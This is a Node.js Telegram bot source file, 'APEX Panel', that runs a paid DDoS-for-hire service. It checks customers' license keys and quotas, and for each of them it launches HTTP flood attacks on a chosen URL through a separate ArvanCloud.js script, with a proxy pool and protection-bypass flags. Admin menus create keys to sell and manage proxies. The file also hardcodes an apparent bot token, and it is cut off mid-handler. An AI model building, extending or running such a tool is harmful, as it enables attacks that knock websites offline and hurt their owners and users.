'use strict';

const fs   = require('fs');
const path = require('path');
const { spawn } = require('child_process');
const TelegramBot = require('node-telegram-bot-api');

// defensive import — handles broken installs that return { default: ... }
const Bot = typeof TelegramBot === 'function'
    ? TelegramBot
    : (TelegramBot && (TelegramBot.default || TelegramBot.TelegramBot)) || null;
if (typeof Bot !== 'function') {
    throw new Error('node-telegram-bot-api did not export a constructor. Run: npm i node-telegram-bot-api@0.66.0');
}

// =============================================================
//  CONFIG
// =============================================================
const CONFIG = {
    OWNER_ID:   8872751291,
    BOT_TOKEN:  '9080161286:AAEnKnlaGjlcnFF69iQ8BfR5ZIkY6SDOZkc',

    SCRIPT_PATH: 'ArvanCloud.js',
    BANNER_FILE: 'banner.txt',

    MAX_ATTACK_DURATION:     600,
    MAX_CONCURRENT_GLOBAL:   8,
    HARD_MAX_THREADS:        500,
    HARD_MAX_RATE:           500,

    DATA_DIR: path.join(__dirname, 'data'),
};

// =============================================================
//  STORAGE
// =============================================================
if (!fs.existsSync(CONFIG.DATA_DIR)) fs.mkdirSync(CONFIG.DATA_DIR, { recursive: true });

const FILES = {
    users:    path.join(CONFIG.DATA_DIR, 'users.json'),
    licenses: path.join(CONFIG.DATA_DIR, 'licenses.json'),
    admins:   path.join(CONFIG.DATA_DIR, 'admins.json'),
    stats:    path.join(CONFIG.DATA_DIR, 'stats.json'),
    proxies:  path.join(CONFIG.DATA_DIR, 'proxies.txt'),
};

const loadJSON = (f, d) => { try { return JSON.parse(fs.readFileSync(f, 'utf8')); } catch { return d; } };
const saveJSON = (f, d) => { try { fs.writeFileSync(f, JSON.stringify(d, null, 2)); } catch (e) { console.error(e); } };

let users    = loadJSON(FILES.users, {});
let licenses = loadJSON(FILES.licenses, {});
let admins   = loadJSON(FILES.admins, []);
let stats    = loadJSON(FILES.stats, { totalAttacks: 0, totalUsers: 0, totalLicenses: 0 });

// migrate: legacy ./proxies.txt OR ./data/proxy.txt -> ./data/proxies.txt
(function migrateProxies() {
    const legacyPlural = path.join(__dirname, 'proxies.txt');
    const legacySingular = path.join(CONFIG.DATA_DIR, 'proxy.txt');
    const target = FILES.proxies;
    if (fs.existsSync(target)) return;
    if (fs.existsSync(legacyPlural)) { try { fs.copyFileSync(legacyPlural, target); return; } catch {} }
    if (fs.existsSync(legacySingular)) { try { fs.copyFileSync(legacySingular, target); return; } catch {} }
    fs.writeFileSync(target, '');
})();

// =============================================================
//  RUNTIME STATE
// =============================================================
const userState     = new Map();
const activeAttacks = new Map();
let   attackCounter = 0;

// =============================================================
//  HELPERS
// =============================================================
const now = () => Date.now();
const DAY = 86400000;
const isOwner = id => Number(id) === CONFIG.OWNER_ID;
const isAdmin = id => isOwner(id) || admins.includes(Number(id));
const esc = s => String(s).replace(/[_*`\[\]()~>#+\-=|{}.!]/g, m => '\\' + m);

function getUser(id) {
    const k = String(id);
    if (!users[k]) {
        users[k] = {
            id: Number(id), username: '', firstName: '',
            joinedAt: now(), licenseKey: null, activatedAt: null, expiresAt: null,
            banned: false, totalAttacks: 0,
            daily: { date: '', count: 0 },
            lastAttackAt: 0,
        };
    }
    const u = users[k];
    if (!u.daily) u.daily = { date: '', count: 0 };
    if (typeof u.lastAttackAt !== 'number') u.lastAttackAt = 0;
    return u;
}

function todayStr() {
    const d = new Date();
    return `${d.getUTCFullYear()}-${String(d.getUTCMonth()+1).padStart(2,'0')}-${String(d.getUTCDate()).padStart(2,'0')}`;
}

function resetDailyIfNeeded(u) {
    const t = todayStr();
    if (u.daily.date !== t) { u.daily.date = t; u.daily.count = 0; }
}

function getLicenseForUser(userId) {
    const u = users[String(userId)];
    if (!u || !u.licenseKey) return null;
    return licenses[u.licenseKey] || null;
}

function isLicensed(id) {
    const u = users[String(id)];
    if (!u || u.banned) return false;
    return u.expiresAt && u.expiresAt > now();
}

function fmtDate(ts) {
    if (!ts) return '—';
    return new Date(ts).toISOString().replace('T', ' ').slice(0, 16) + ' UTC';
}

function genLicenseKey() {
    const seg = () => Math.random().toString(36).substring(2, 6).toUpperCase().padEnd(4, 'X');
    return `APEX-${seg()}-${seg()}-${seg()}-${seg()}`;
}

// =============================================================
//  COOLDOWN / DAILY LIMIT CHECKS
// =============================================================
function checkAttackPermission(userId) {
    const u = getUser(userId);
    const lic = getLicenseForUser(userId);

    if (!u.expiresAt || u.expiresAt <= now())
        return { ok: false, reason: 'Your license has expired. Contact admin.' };

    resetDailyIfNeeded(u);
    const dailyLimit = lic?.dailyLimit ?? 5;
    if (u.daily.count >= dailyLimit)
        return { ok: false, reason: `Daily attack limit reached (${u.daily.count}/${dailyLimit}). Resets at 00:00 UTC.` };

    const cooldownMs = (lic?.cooldownSeconds ?? 60) * 1000;
    const remain = u.lastAttackAt + cooldownMs - now();
    if (remain > 0)
        return { ok: false, reason: `Cooldown active: wait ${Math.ceil(remain/1000)}s before next attack.` };

    const concurrent = [...activeAttacks.values()].filter(a => a.userId === userId).length;
    const maxConc = lic?.maxConcurrent ?? 1;
    if (concurrent >= maxConc)
        return { ok: false, reason: `Concurrent attack limit reached (${concurrent}/${maxConc}).` };

    if (activeAttacks.size >= CONFIG.MAX_CONCURRENT_GLOBAL)
        return { ok: false, reason: 'Server is busy. Try again in a moment.' };

    return { ok: true, license: lic };
}

// =============================================================
//  KEYBOARDS
// =============================================================
function mainMenuKeyboard(userId) {
    const rows = [
        [{ text: '🚀 New Attack',        callback_data: 'menu_attack' }],
        [{ text: '📊 My Active Attacks', callback_data: 'menu_active' }],
        [{ text: '🔑 License Info',      callback_data: 'menu_license' }],
    ];
    if (isAdmin(userId)) rows.push([{ text: '🛡 Admin Panel', callback_data: 'menu_admin' }]);
    return { inline_keyboard: rows };
}

function adminMenuKeyboard() {
    return {
        inline_keyboard: [
            [{ text: '📊 Stats',            callback_data: 'adm_stats' },
             { text: '👥 Users',            callback_data: 'adm_users' }],
            [{ text: '🔑 Create License',   callback_data: 'adm_gen_license' },
             { text: '📋 Licenses',         callback_data: 'adm_licenses' }],
            [{ text: '🚫 Ban User',         callback_data: 'adm_ban' },
             { text: '✅ Unban User',       callback_data: 'adm_unban' }],
            [{ text: '♻️ Reset Cooldown',   callback_data: 'adm_reset_cd' }],
            [{ text: '👤 Add Admin',        callback_data: 'adm_add_admin' },
             { text: '🗑 Remove Admin',     callback_data: 'adm_rm_admin' }],
            [{ text: '➕ Add Proxies',      callback_data: 'adm_proxies_add' },
             { text: '♻️ Replace Proxies',  callback_data: 'adm_proxies_replace' }],
            [{ text: '📈 Proxy Count',      callback_data: 'adm_proxies_count' }],
            [{ text: '🛑 Stop All Attacks', callback_data: 'adm_stop_all' }],
            [{ text: '📢 Broadcast',        callback_data: 'adm_broadcast' }],
        ]
    };
}

function attackOptionsKeyboard(data) {
    const o = data.options || {};
    const m = v => (v ? '✅ ' : '❌ ');
    return {
        inline_keyboard: [
            [{ text: m(o.bypass)   + 'Bypass',   callback_data: 'opt_bypass'   },
             { text: m(o.redirect) + 'Redirect', callback_data: 'opt_redirect' }],
            [{ text: m(o.origin)   + 'Origin',   callback_data: 'opt_origin'   },
             { text: m(o.cookies)  + 'Cookies',  callback_data: 'opt_cookies'  }],
            [{ text: m(o.silent)   + 'Silent',   callback_data: 'opt_silent'   },
             { text: '🌐 HTTP v' + (o.version || '2'), callback_data: 'opt_version' }],
            [{ text: '✅ Confirm & Start', callback_data: 'opt_confirm' },
             { text: '❌ Cancel',          callback_data: 'opt_cancel'  }],
        ]
    };
}

// =============================================================
//  ATTACK LAUNCHER
// =============================================================
function startAttack(chatId, userId, target, duration, threads, rate, options, reply) {
    const perm = checkAttackPermission(userId);
    if (!perm.ok) return reply(`❌ ${perm.reason}`);

    const scriptPath = path.join(__dirname, CONFIG.SCRIPT_PATH);
    const proxyPath  = FILES.proxies;

    if (!fs.existsSync(scriptPath)) return reply('❌ ArvanCloud.js not found.');
    if (!fs.existsSync(proxyPath) || fs.statSync(proxyPath).size < 5)
        return reply('❌ Proxy pool is empty. Contact admin.');

    const args = [CONFIG.SCRIPT_PATH, target, String(duration), proxyPath, String(threads), String(rate)];
    if (options.bypass)   args.push('-bypass');
    if (options.redirect) args.push('-redirect');
    if (options.origin)   args.push('-origin');
    if (options.cookies)  args.push('-c');
    if (options.silent)   args.push('-s');
    if (options.version)  args.push('-v', String(options.version));

    const proc = spawn('node', args, {
        cwd: __dirname,
        stdio: ['ignore', 'pipe', 'pipe'],
        env: { ...process.env, FORCE_COLOR: '0' },
    });

    const attackId = ++attackCounter;
    const endTime  = now() + duration * 1000;

    let stderrBuf = '';
    let stdoutBuf = '';
    proc.stderr.on('data', d => {
        stderrBuf += d.toString();
        if (stderrBuf.length > 16000) stderrBuf = stderrBuf.slice(-16000);
    });
    proc.stdout.on('data', d => {
        stdoutBuf += d.toString();
        if (stdoutBuf.length > 16000) stdoutBuf = stdoutBuf.slice(-16000);
    });

    const killTimer = setTimeout(() => {
        if (activeAttacks.has(attackId)) { try { proc.kill('SIGKILL'); } catch {} }
    }, (duration + 8) * 1000);

    activeAttacks.set(attackId, {
        id: attackId, chatId, userId, target, duration, threads, rate, options,
        proc, endTime, startedAt: now(), killTimer,
    });

    const u = getUser(userId);
    resetDailyIfNeeded(u);
    u.daily.count += 1;
    u.lastAttackAt = now();
    u.totalAttacks = (u.totalAttacks || 0) + 1;
    saveJSON(FILES.users, users);

    stats.totalAttacks = (stats.totalAttacks || 0) + 1;
    saveJSON(FILES.stats, stats);

    proc.on('exit', code => {
        clearTimeout(killTimer);
        activeAttacks.delete(attackId);

        // combine stderr and last stdout lines for context
        let errorTail = '';
        if (code !== 0) {
            const src = (stderrBuf.trim() || stdoutBuf.trim());
            if (src) {
                const lines = src.split('\n').slice(-12).join('\n');
                errorTail = `\n\n📋 Last error:\n\`\`\`\n${lines}\n\`\`\``;
            }
        }

        const msg =
            `✅ *Attack #${attackId} finished*\n` +
            `🎯 \`${target}\`\n` +
            `⏱ ${duration}s — exit ${code}${errorTail}`;

        bot.sendMessage(chatId, msg.length > 4000 ? msg.slice(0, 3990) + '\n...' : msg,
            { parse_mode: 'Markdown' }
        ).catch(() => {
            // fallback plain text if Markdown breaks (backticks in error output)
            const plain =
                `Attack #${attackId} finished (exit ${code})\n` +
                `Target: ${target}\n\n` +
                ((stderrBuf.trim() || stdoutBuf.trim()).split('\n').slice(-12).join('\n') || '');
            bot.sendMessage(chatId, plain.slice(0, 4000)).catch(() => {});
        });
    });

    proc.on('error', err => {
        bot.sendMessage(chatId, `❌ Launch error: ${esc(err.message)}`).catch(() => {});
    });

    const flagsOn = Object.entries(options)
        .filter(([k, v]) => v && k !== 'version')
        .map(([k]) => k).join(', ') || '—';

    const lic = getLicenseForUser(userId);
    const dailyLeft = (lic?.dailyLimit ?? 5) - u.daily.count;
    const cd = lic?.cooldownSeconds ?? 60;

    reply(
        `🚀 *Attack #${attackId} started*\n\n` +
        `🎯 Target: \`${target}\`\n` +
        `⏱ Duration: ${duration}s\n` +
        `🧵 Threads: ${threads}\n` +
        `⚡ Rate: ${rate}\n` +
        `🔧 Flags: ${flagsOn} | HTTP v${options.version || '2'}\n\n` +
        `📊 *Quota*\n` +
        `• Daily used: ${u.daily.count}/${lic?.dailyLimit ?? 5} (${dailyLeft} left)\n` +
        `• Cooldown: ${cd}s`
    );
    return attackId;
}

// =============================================================
//  BOT INIT
// =============================================================
const bot = new Bot(CONFIG.BOT_TOKEN, { polling: true });

bot.setMyCommands([
    { command: 'start',  description: 'Start / Main menu' },
    { command: 'attack', description: 'Quick attack: /attack <target> [dur] [threads] [rate] [flags]' },
    { command: 'active', description: 'My active attacks' },
    { command: 'quota',  description: 'Check cooldown + daily quota' },
    { command: 'cancel', description: 'Cancel current operation' },
    { command: 'admin',  description: 'Admin panel (admin only)' },
]).catch(() => {});

// =============================================================
//  /start
// =============================================================
bot.onText(/^\/start(?:@\w+)?(?:\s|$)/, (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const u = getUser(userId);
    u.username  = msg.from.username || u.username;
    u.firstName = msg.from.first_name || u.firstName;
    saveJSON(FILES.users, users);

    if (u.banned) return bot.sendMessage(chatId, '⛔️ You are banned from this bot.');

    if (!isLicensed(userId)) {
        userState.set(chatId, { step: 'await_license', data: {} });
        return bot.sendMessage(chatId,
            `🎯 *APEX Panel*\n\n` +
            `Welcome ${esc(msg.from.first_name || 'friend')} 👋\n\n` +
            `🔑 Send your license key to activate.\n\n` +
            `⚠️ *Note:* Only sites protected by *ArvanCloud* are supported.\n\n` +
            `📝 Format: \`APEX-XXXX-XXXX-XXXX-XXXX\``,
            { parse_mode: 'Markdown' }
        );
    }

    const lic = getLicenseForUser(userId);
    resetDailyIfNeeded(u);
    saveJSON(FILES.users, users);

    const daysLeft = Math.max(0, Math.ceil((u.expiresAt - now()) / DAY));
    const cdRemain = Math.max(0, Math.ceil((u.lastAttackAt + (lic?.cooldownSeconds ?? 60)*1000 - now()) / 1000));

    bot.sendMessage(chatId,
        `🎯 *APEX Panel*\n\n` +
        `👤 User ID: \`${userId}\`\n` +
        `📅 License valid: ${daysLeft} day(s)\n` +
        `📊 Daily quota: ${u.daily.count}/${lic?.dailyLimit ?? 5}\n` +
        `⏳ Cooldown: ${cdRemain > 0 ? cdRemain + 's remaining' : 'ready'}\n\n` +
        `Choose from the menu:`,
        { parse_mode: 'Markdown', reply_markup: mainMenuKeyboard(userId) }
    );
});

// =============================================================
//  /quota
// =============================================================
bot.onText(/^\/quota/, (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    if (!isLicensed(userId)) return bot.sendMessage(chatId, '❌ No active license.');
    const u = getUser(userId);
    const lic = getLicenseForUser(userId);
    resetDailyIfNeeded(u);
    saveJSON(FILES.users, users);

    const cdRemain = Math.max(0, Math.ceil((u.lastAttackAt + (lic?.cooldownSeconds ?? 60)*1000 - now()) / 1000));
    const dailyLeft = (lic?.dailyLimit ?? 5) - u.daily.count;

    bot.sendMessage(chatId,
        `📊 *Your Quota*\n\n` +
        `• Daily: ${u.daily.count}/${lic?.dailyLimit ?? 5} used — ${dailyLeft} left\n` +
        `• Cooldown: ${cdRemain > 0 ? cdRemain + 's remaining' : '✅ ready'}\n` +
        `• Concurrent limit: ${lic?.maxConcurrent ?? 1}\n` +
        `• Resets daily at 00:00 UTC`,
        { parse_mode: 'Markdown' }
    );
});

// =============================================================
//  /admin
// =============================================================
bot.onText(/^\/admin/, (msg) => {
    if (!isAdmin(msg.from.id)) return;
    bot.sendMessage(msg.chat.id, '🛡 *Admin Panel*', {
        parse_mode: 'Markdown', reply_markup: adminMenuKeyboard()
    });
});

// =============================================================
//  /active
// =============================================================
bot.onText(/^\/active/, (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const list = [...activeAttacks.values()].filter(a => a.userId === userId);
    if (!list.length) return bot.sendMessage(chatId, '📭 No active attacks.');
    const kb = { inline_keyboard: [] };
    let txt = '📊 *Your Active Attacks*\n\n';
    for (const a of list) {
        const rem = Math.max(0, Math.floor((a.endTime - now()) / 1000));
        txt += `#${a.id} → \`${a.target}\` — ${rem}s\n`;
        kb.inline_keyboard.push([{ text: `🛑 Stop #${a.id}`, callback_data: `stop_${a.id}` }]);
    }
    bot.sendMessage(chatId, txt, { parse_mode: 'Markdown', reply_markup: kb });
});

// =============================================================
//  /cancel
// =============================================================
bot.onText(/^\/cancel/, (msg) => {
    userState.delete(msg.chat.id);
    bot.sendMessage(msg.chat.id, '❌ Operation cancelled.');
});

// =============================================================
//  /attack (one-liner)
// =============================================================
bot.onText(/^\/attack(?:\s+(.+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    if (!isLicensed(userId)) return bot.sendMessage(chatId, '❌ No active license.');
    const raw = (match[1] || '').trim();
    if (!raw) {
        userState.set(chatId, { step: 'attack_target', data: {} });
        return bot.sendMessage(chatId, '🎯 Send target URL:');
    }
    const parts = raw.split(/\s+/);
    let target = parts[0];
    if (!/^https?:\/\//i.test(target)) target = 'https://' + target;
    const dur  = Math.min(parseInt(parts[1]) || 60, CONFIG.MAX_ATTACK_DURATION);
    const thr  = Math.min(parseInt(parts[2]) || 40, CONFIG.HARD_MAX_THREADS);
    const rate = Math.min(parseInt(parts[3]) || 64, CONFIG.HARD_MAX_RATE);
    const flags = parts.slice(4);
    const options = {
        bypass:   flags.length === 0 || flags.includes('-bypass'),
        redirect: flags.includes('-redirect'),
        origin:   flags.includes('-origin'),
        cookies:  flags.includes('-c'),
        silent:   flags.length === 0 || flags.includes('-s'),
        version:  flags.includes('-v1') ? '1' : '2',
    };
    startAttack(chatId, userId, target, dur, thr, rate, options,
        t => bot.sendMessage(chatId, t, { parse_mode: 'Markdown' }));
});

// =============================================================
//  MESSAGE HANDLER
// =============================================================
bot.on('message', async (msg) => {
    if (!msg.text || msg.text.startsWith('/')) return;
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const st = userState.get(chatId);
    if (!st) return;

    // ---- License activation ----
    if (st.step === 'await_license') {
        const code = msg.text.trim().toUpperCase();
        const lic = licenses[code];
        if (!lic) return bot.sendMessage(chatId, '❌ Invalid license key.');
        if (lic.expiresAt && lic.expiresAt < now()) return bot.sendMessage(chatId, '❌ This license has expired.');
        if ((lic.usedCount || 0) >= lic.maxUses) return bot.sendMessage(chatId, '❌ This license is fully used.');

        lic.usedCount = (lic.usedCount || 0) + 1;
        lic.usedBy = lic.usedBy || [];
        lic.usedBy.push({ userId, at: now() });
        saveJSON(FILES.licenses, licenses);

        const u = getUser(userId);
        const startFrom = Math.max(now(), u.expiresAt || 0);
        u.licenseKey  = code;
        u.activatedAt = now();
        u.expiresAt   = startFrom + lic.durationDays * DAY;
        u.daily = { date: todayStr(), count: 0 };
        u.lastAttackAt = 0;
        saveJSON(FILES.users, users);

        userState.delete(chatId);
        await bot.sendMessage(chatId,
            `✅ *License activated!*\n\n` +
            `📅 Duration: ${lic.durationDays} day(s)\n` +
            `📊 Daily limit: ${lic.dailyLimit ?? 5} attacks\n` +
            `⏳ Cooldown: ${lic.cooldownSeconds ?? 60}s\n` +
            `🧵 Concurrent: ${lic.maxConcurrent ?? 1}`,
            { parse_mode: 'Markdown' });
        return bot.sendMessage(chatId, 'Choose from the menu:',
            { reply_markup: mainMenuKeyboard(userId) });
    }

    // ---- Attack wizard ----
    if (st.step === 'attack_target') {
        let t = msg.text.trim();
        if (!/^https?:\/\//i.test(t)) t = 'https://' + t;
        try {
            const u = new URL(t);
            if (!u.hostname) throw new Error();
            st.data.target = t;
            st.step = 'attack_duration';
            return bot.sendMessage(chatId, `⏱ Duration in seconds (1 - ${CONFIG.MAX_ATTACK_DURATION}):`);
        } catch {
            return bot.sendMessage(chatId, '❌ Invalid URL. Try again:');
        }
    }

    if (st.step === 'attack_duration') {
        const d = parseInt(msg.text.trim());
        if (!d || d < 1 || d > CONFIG.MAX_ATTACK_DURATION)
            return bot.sendMessage(chatId, `❌ Must be 1 - ${CONFIG.MAX_ATTACK_DURATION}.`);
        st.data.duration = d;
        st.step = 'attack_threads';
        return bot.sendMessage(chatId,
            `🧵 Threads (1 - ${CONFIG.HARD_MAX_THREADS}):`,
            { reply_markup: { inline_keyboard: [[{ text: 'Use default (40)', callback_data: 'def_threads' }]] } });
    }

    if (st.step === 'attack_threads') {
        const t = parseInt(msg.text.trim());
        if (!t || t < 1 || t > CONFIG.HARD_MAX_THREADS)
            return bot.sendMessage(chatId, `❌ Must be 1 - ${CONFIG.HARD_MAX_THREADS}.`);
        st.data.threads = t;
        st.step = 'attack_rate';
        return bot.sendMessage(chatId,
            `⚡ Rate (1 - ${CONFIG.HARD_MAX_RATE}):`,
            { reply_markup: { inline_keyboard: [[{ text: 'Use default (64)', callback_data: 'def_rate' }]] } });
    }

    if (st.step === 'attack_rate') {
        const r = parseInt(msg.text.trim());
        if (!r || r < 1 || r > CONFIG.HARD_MAX_RATE)
            return bot.sendMessage(chatId, `❌ Must be 1 - ${CONFIG.HARD_MAX_RATE}.`);
        st.data.rate = r;
        st.data.options = { bypass: true, redirect: false, origin: false, cookies: false, silent: true, version: '2' };
        st.step = 'attack_options';
        return bot.sendMessage(chatId, '🔧 Configure options:',
            { reply_markup: attackOptionsKeyboard(st.data) });
    }

    // ---- License creation flow ----
    if (st.step === 'adm_lic_days') {
        if (!isAdmin(userId)) return;
        const d = parseInt(msg.text.trim());
        if (!d || d < 1 || d > 3650) return bot.sendMessage(chatId, '❌ 1 - 3650 days.');
        st.data.days = d;
        st.step = 'adm_lic_uses';
        return bot.sendMessage(chatId, '👥 Max activations (how many users can use this key):',
            { reply_markup: { inline_keyboard: [
                [{ text: '1 (single)', callback_data: 'lic_uses_1' }, { text: '5', callback_data: 'lic_uses_5' }],
                [{ text: '10', callback_data: 'lic_uses_10' }, { text: '∞', callback_data: 'lic_uses_inf' }],
            ] } });
    }

    if (st.step === 'adm_lic_daily') {
        if (!isAdmin(userId)) return;
        const d = parseInt(msg.text.trim());
        if (!d || d < 1 || d > 1000) return bot.sendMessage(chatId, '❌ 1 - 1000 attacks/day.');
        st.data.dailyLimit = d;
        st.step = 'adm_lic_cooldown';
        return bot.sendMessage(chatId, '⏳ Cooldown between attacks (seconds, 0 - 86400):');
    }

    if (st.step === 'adm_lic_cooldown') {
        if (!isAdmin(userId)) return;
        const s = parseInt(msg.text.trim());
        if (isNaN(s) || s < 0 || s > 86400) return bot.sendMessage(chatId, '❌ 0 - 86400 seconds.');
        st.data.cooldownSeconds = s;
        st.step = 'adm_lic_concurrent';
        return bot.sendMessage(chatId, '🧵 Max concurrent attacks per user (1 - 10):');
    }

    if (st.step === 'adm_lic_concurrent') {
        if (!isAdmin(userId)) return;
        const c = parseInt(msg.text.trim());
        if (!c || c < 1 || c > 10) return bot.sendMessage(chatId, '❌ 1 - 10.');
        st.data.maxConcurrent = c;

        const key = genLicenseKey();
        licenses[key] = {
            key,
            durationDays:    st.data.days,
            maxUses:         st.data.uses,
            dailyLimit:      st.data.dailyLimit,
            cooldownSeconds: st.data.cooldownSeconds,
            maxConcurrent:   st.data.maxConcurrent,
            usedCount: 0,
            usedBy: [],
            createdAt: now(),
            expiresAt: now() + 365 * DAY,
            createdBy: userId,
        };
        saveJSON(FILES.licenses, licenses);
        stats.totalLicenses = (stats.totalLicenses || 0) + 1;
        saveJSON(FILES.stats, stats);
        userState.delete(chatId);

        return bot.sendMessage(chatId,
            `✅ *License created*\n\n` +
            `🔑 \`${key}\`\n\n` +
            `📅 Access: ${st.data.days} day(s)\n` +
            `👥 Activations: ${st.data.uses === 9999 ? '∞' : st.data.uses}\n` +
            `📊 Daily limit: ${st.data.dailyLimit} attack(s)\n` +
            `⏳ Cooldown: ${st.data.cooldownSeconds}s\n` +
            `🧵 Concurrent: ${st.data.maxConcurrent}\n\n` +
            `Send this key to your customer.`,
            { parse_mode: 'Markdown', reply_markup: adminMenuKeyboard() }
        );
    }

    // ---- Broadcast ----
    if (st.step === 'adm_broadcast') {
        if (!isAdmin(userId)) return;
        const text = msg.text;
        let ok = 0, fail = 0;
        for (const id of Object.keys(users)) {
            try { await bot.sendMessage(id, `📢 *Admin broadcast*\n\n${text}`, { parse_mode: 'Markdown' }); ok++; }
            catch { fail++; }
        }
        userState.delete(chatId);
        return bot.sendMessage(chatId, `📢 Sent.\n✅ ${ok} | ❌ ${fail}`);
    }

    // ---- Proxies: MERGE or REPLACE ----
    if (st.step === 'adm_proxies') {
        if (!isAdmin(userId)) return;

        const newLines = msg.text
            .split('\n')
            .map(l => l.trim())
            .filter(l => /^[^:\s]+:\d+$/.test(l));

        if (!newLines.length)
            return bot.sendMessage(chatId, '❌ Wrong format. Each line: `host:port`', { parse_mode: 'Markdown' });

        let existing = [];
        try {
            existing = fs.readFileSync(FILES.proxies, 'utf8')
                .split('\n').map(l => l.trim()).filter(Boolean);
        } catch {}

        const mode = st.data.mode || 'add';

        let finalList;
        if (mode === 'replace') {
            finalList = [...new Set(newLines)];
        } else {
            finalList = [...new Set([...existing, ...newLines])];
        }

        fs.writeFileSync(FILES.proxies, finalList.join('\n'));
        userState.delete(chatId);

        const added = finalList.length - existing.length;
        const total = finalList.length;
        const dupes = mode === 'add'
            ? (existing.length + newLines.length - total)
            : (newLines.length - total);

        return bot.sendMessage(chatId,
            `✅ *Proxies updated*\n\n` +
            `📥 Submitted: ${newLines.length}\n` +
            `➕ Added: ${Math.max(0, added)}\n` +
            `♻️ Mode: ${mode === 'replace' ? 'REPLACED' : 'MERGED'}\n` +
            (dupes > 0 ? `🔁 Duplicates skipped: ${dupes}\n` : '') +
            `📊 Total in pool: *${total}*\n` +
            `📁 File: \`data/proxies.txt\``,
            { parse_mode: 'Markdown', reply_markup: adminMenuKeyboard() }
        );
    }

    // ---- Ban / Unban ----
    if (st.step === 'adm_ban' || st.step === 'adm_unban') {
        if (!isAdmin(userId)) return;
        const tgt = parseInt(msg.text.trim());
        if (!users[tgt]) return bot.sendMessage(chatId, '❌ User not found.');
        users[tgt].banned = st.step === 'adm_ban';
        saveJSON(FILES.users, users);
        userState.delete(chatId);
        return bot.sendMessage(chatId,
            `✅ User \`${tgt}\` ${st.step === 'adm_ban' ? 'banned' : 'unbanned'}.`,
            { parse_mode: 'Markdown' });
    }

    // ---- Reset cooldown ----
    if (st.step === 'adm_reset_cd') {
        if (!isAdmin(userId)) return;
        const tgt = parseInt(msg.text.trim());
        if (!users[tgt]) return bot.sendMessage(chatId, '❌ User not found.');
        users[tgt].lastAttackAt = 0;
        users[tgt].daily = { date: todayStr(), count: 0 };
        saveJSON(FILES.users, users);
        userState.delete(chatId);
        return bot.sendMessage(chatId,
            `♻️ Cooldown + daily counter reset for \`${tgt}\`.`,
            { parse_mode: 'Markdown' });
    }

    // ---- Add / remove admin ----
    if (st.step === 'adm_add_admin' || st.step === 'adm_rm_admin') {
        if (!isOwner(userId)) return bot.sendMessage(chatId, '❌ Owner only.');
        const tgt = parseInt(msg.text.trim());
        if (!tgt) return;
        if (st.step === 'adm_add_admin') {
            if (!admins.includes(tgt)) admins.push(tgt);
        } else {
            admins = admins.filter(a => a !== tgt);
        }
        saveJSON(FILES.admins, admins);
        userState.delete(chatId);
        return bot.sendMessage(chatId,
            `✅ Admin \`${tgt}\` ${st.step === 'adm_add_admin' ? 'added' : 'removed'}.`,
            { parse_mode: 'Markdown' });
    }
});

// =============================================================
//  CALLBACK HANDLER
// =============================================================
bot.on('callback_query', (q) => {
    const chatId = q.message.chat.id;
    const userId = q.from.id;
    const msgId  = q.message.message_id;
    const data   = q.data;

    const ans  = t => bot.answerCallbackQuery(q.id, { text: t }).catch(() => {});
    const edit = (t, kb) => bot.editMessageText(t, {
        chat_id: chatId, message_id: msgId, parse_mode: 'Markdown', reply_markup: kb,
    }).catch(() => {});

    // ---- user menu ----
    if (data === 'menu_attack') {
        if (!isLicensed(userId)) return ans('❌ No active license');
        userState.set(chatId, { step: 'attack_target', data: {} });
        return edit(`🎯 *New Attack*\n\n🔗 Send target URL:\nExample: \`https://target.com\`\n\n⚠️ Only ArvanCloud-protected sites supported.`);
    }

    if (data === 'menu_active') {
        const list = [...activeAttacks.values()].filter(a => a.userId === userId);
        if (!list.length) return ans('📭 No active attacks');
        const kb = { inline_keyboard: [] };
        let txt = '📊 *Your Active Attacks*\n\n';
        for (const a of list) {
            const rem = Math.max(0, Math.floor((a.endTime - now()) / 1000));
            txt += `#${a.id} → \`${a.target}\` — ${rem}s\n`;
            kb.inline_keyboard.push([{ text: `🛑 Stop #${a.id}`, callback_data: `stop_${a.id}` }]);
        }
        return edit(txt, kb);
    }

    if (data === 'menu_license') {
        const u = getUser(userId);
        const lic = getLicenseForUser(userId);
        resetDailyIfNeeded(u);
        const cdRemain = Math.max(0, Math.ceil((u.lastAttackAt + (lic?.cooldownSeconds ?? 60)*1000 - now()) / 1000));
        return edit(
            `🔑 *License Info*\n\n` +
            `🆔 User ID: \`${userId}\`\n` +
            `📝 Key: \`${u.licenseKey || '—'}\`\n` +
            `📅 Activated: ${fmtDate(u.activatedAt)}\n` +
            `⏳ Expires: ${fmtDate(u.expiresAt)}\n\n` +
            `📊 Daily: ${u.daily.count}/${lic?.dailyLimit ?? 5}\n` +
            `⏱ Cooldown: ${lic?.cooldownSeconds ?? 60}s ${cdRemain > 0 ? `(${cdRemain}s left)` : '✅'}\n` +
            `🧵 Concurrent: ${lic?.maxConcurrent ?? 1}\n` +
            `🔥 Total attacks: ${u.totalAttacks || 0}`
        );
    }

    if (data === 'menu_admin' && isAdmin(userId)) {
        return edit('🛡 *Admin Panel*', adminMenuKeyboard());
    }

    // ---- attack options ----
    if (data.startsWith('opt_')) {
        const st = userState.get(chatId);
        if (!st || st.step !== 'attack_options') return ans('Session expired');
        const o = st.data.options;
        if (data === 'opt_bypass')   { o.bypass   = !o.bypass;   return edit('🔧 Options:', attackOptionsKeyboard(st.data)); }
        if (data === 'opt_redirect') { o.redirect = !o.redirect; return edit('🔧 Options:', attackOptionsKeyboard(st.data)); }
        if (data === 'opt_origin')   { o.origin   = !o.origin;   return edit('🔧 Options:', attackOptionsKeyboard(st.data)); }
        if (data === 'opt_cookies')  { o.cookies  = !o.cookies;  return edit('🔧 Options:', attackOptionsKeyboard(st.data)); }
        if (data === 'opt_silent')   { o.silent   = !o.silent;   return edit('🔧 Options:', attackOptionsKeyboard(st.data)); }
        if (data === 'opt_version')  { o.version  = o.version === '2' ? '1' : '2'; return edit('🔧 Options:', attackOptionsKeyboard(st.data)); }
        if (data === 'opt_cancel')   { userState.delete(chatId); return edit('❌ Cancelled.'); }
        if (data === 'opt_confirm') {
            const { target, duration, threads, rate, options } = st.data;
            userState.delete(chatId);
            startAttack(chatId, userId, target, duration, threads, rate, options, t => edit(t));
            return ans('🚀 Launching...');
        }
